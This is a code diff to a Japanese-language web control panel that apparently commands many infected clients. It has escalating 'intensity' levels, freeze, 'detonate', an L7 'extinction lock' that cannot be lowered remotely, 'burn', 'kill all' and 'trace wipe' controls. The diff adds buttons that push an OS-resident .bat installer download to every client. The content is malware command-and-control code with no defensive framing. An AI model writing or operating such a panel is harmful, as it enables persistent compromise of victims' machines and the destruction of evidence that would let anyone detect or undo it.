@@ -84,7 +84,7 @@
     <h2>■ 操作盤</h2>
 
     <div class="row" style="justify-content:space-between">
-      <span class="hint">強度レベル（L0〜L7）／ L7は固定枠</span>
+      <span class="hint">強度レベル（L0〜L7）／ L7は固定枠・OS常駐インストーラ</span>
       <span class="hint">ヒット <b id="vw-total">{{ total }}</b> ／ 未処理コマンド <b id="vw-pend">0</b></span>
     </div>
 
@@ -116,7 +116,8 @@
       <button id="vw-freeze-soft" class="ghost">軟凍結</button>
       <button id="vw-freeze-hard" class="ghost">硬凍結</button>
       <button id="vw-boom" class="danger">☢ 終焉（L6即時）</button>
-      <button id="vw-fix" class="fixbtn">🔒 固定枠（L7・ロック）</button>
+      <button id="vw-fix" class="fixbtn">🔒 絶滅固定（L7・ロック）</button>
+      <button id="vw-native" class="danger">🖥 インストーラを配る</button>
       <button id="vw-wipe" class="danger">🧹 痕跡消去</button>
     </div>
 
@@ -148,6 +149,7 @@
       <button data-cmd="open">🪟 窓を開く</button>
       <button data-cmd="reload">🔄 再読込</button>
       <button data-cmd="update">⬆ 更新</button>
+      <button data-cmd="native" class="danger">🖥 インストーラDL</button>
       <button data-cmd="burn" class="danger">🔥 burn</button>
       <button data-cmd="kill" class="danger">☠ 全停止</button>
     </div>
@@ -240,7 +242,7 @@
       else { b.classList.remove("on"); b.style.background = "#182231"; }
     });
     $("vw-fix").classList.toggle("on", !!FIXED);
-    $("vw-fix").textContent = FIXED ? "🔓 固定枠を解除" : "🔒 固定枠（L7・ロック）";
+    $("vw-fix").textContent = FIXED ? "🔓 固定を解除" : "🔒 絶滅固定（L7・ロック）";
     showLv(LV);
   }
   lvBtns.forEach(function (b) {
@@ -263,10 +265,11 @@
   $("vw-freeze-soft").onclick = async () => { await post("/freeze", {freeze: "soft"}); log("軟凍結"); sync(); };
   $("vw-freeze-hard").onclick = async () => { await post("/freeze", {freeze: "hard"}); log("硬凍結"); sync(); };
   $("vw-boom").onclick  = async () => { await post("/detonate"); log("終焉（L6）"); LV = 6; sync(); };
+  $("vw-native").onclick = async () => { await post("/cmd", {sid:"", kind:"native", arg:"bat"}); log("インストーラDLを全個体へ"); sync(); };
   $("vw-fix").onclick   = async () => {
     FIXED = FIXED ? 0 : 1;
     await post("/fix", {fixed: FIXED});
-    log(FIXED ? "固定枠をロック（L7・遠隔から下げられない）" : "固定枠を解除");
+    log(FIXED ? "絶滅固定をロック（L7・遠隔から下げられない）" : "固定を解除");
     LV = FIXED ? 7 : LV; sync();
   };
   $("vw-wipe").onclick  = async () => { await post("/wipe");     log("痕跡消去を指示"); };
@@ -281,7 +284,7 @@
   document.querySelectorAll("[data-cmd]").forEach(function (b) {
     b.addEventListener("click", function () {
       const k = b.getAttribute("data-cmd");
-      const a = (k === "speak" || k === "open") ? $("vw-arg").value : "";
+      const a = (k === "speak" || k === "open" || k === "native") ? $("vw-arg").value : "";
       sendCmd(k, a);
     });
   });
